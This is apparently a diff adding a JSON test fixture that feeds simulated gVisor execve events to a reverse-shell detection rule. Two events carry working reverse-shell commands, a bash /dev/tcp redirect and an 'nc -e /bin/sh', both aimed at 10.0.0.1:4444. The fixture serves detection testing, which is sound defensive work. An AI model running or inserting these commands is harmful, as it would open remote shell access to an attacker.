@@ -1,0 +1,44 @@
+{
+  "description": "/dev/tcp and nc -e reverse shells.",
+  "expect": [
+    "gVisor Reverse Shell Command Line"
+  ],
+  "events": [
+    {
+      "point": "sentry/execve",
+      "pid": 1,
+      "ppid": 0,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "argv": [
+        "/bin/sh"
+      ]
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 2,
+      "ppid": 1,
+      "comm": "bash",
+      "exe": "/bin/bash",
+      "argv": [
+        "bash",
+        "-c",
+        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+      ]
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 3,
+      "ppid": 1,
+      "comm": "nc",
+      "exe": "/usr/bin/nc",
+      "argv": [
+        "nc",
+        "10.0.0.1",
+        "4444",
+        "-e",
+        "/bin/sh"
+      ]
+    }
+  ]
+}
